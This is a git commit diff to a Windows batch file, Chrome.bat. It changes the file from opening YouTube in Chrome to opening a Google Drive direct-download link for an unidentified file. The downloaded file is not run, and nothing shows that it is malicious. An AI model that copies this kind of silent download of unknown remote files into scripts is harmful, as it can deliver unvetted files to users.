61de20873801269a1d87ac6f9f35bce5843fe00c
Techjalandhar <61079999+jalandhar792@users.noreply.github.com>
2021-07-19 09:56:03 +0530

    Update

--- Files/Chrome.bat
+++ Files/Chrome.bat
@@ -1,4 +1,4 @@
 @echo off
 cd C:\Program Files\Google\Chrome\Applications
-start chrome.exe www.youtube.com
+start chrome.exe https://drive.google.com/uc?export=download&id=1MsOPI9jPBR7SUkp61dw58QgKDAyci8g1
 
